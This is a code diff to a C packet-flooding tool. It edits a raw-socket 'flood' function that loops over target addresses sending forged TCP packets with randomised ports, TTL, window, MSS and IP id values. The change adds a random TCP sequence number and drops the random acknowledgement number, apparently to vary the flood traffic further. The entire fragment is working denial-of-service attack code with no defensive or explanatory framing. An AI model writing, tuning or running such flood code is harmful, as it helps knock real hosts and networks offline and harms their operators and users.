@@ -265,6 +265,7 @@ void *flood(void *par1)
 		ports[0] = randnum(1, 1024);
 		tcph->check = 0;
 		opts->mssvalue = htons(1360 + (rand_cmwc() % 100));
+		tcph->seq = htonl(randnum(1000000, 9999999)); // Custom sequence number
 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
 		setup_tcpopts_header(opts);
 		tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpOptions)) / 4;
@@ -274,7 +275,6 @@ void *flood(void *par1)
 		iph->daddr = list_node->data.sin_addr.s_addr;
 		iph->id = htonl(rand_cmwc() & 0xFFFF);
 		iph->check = csum((unsigned short *)datagram, iph->tot_len);
-		tcph->ack_seq = randnum(10000, 99999);
 		iph->ttl = randnum(64, 255);
 		tcph->window = htons(windows[rand_cmwc() % 4]);
 		tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
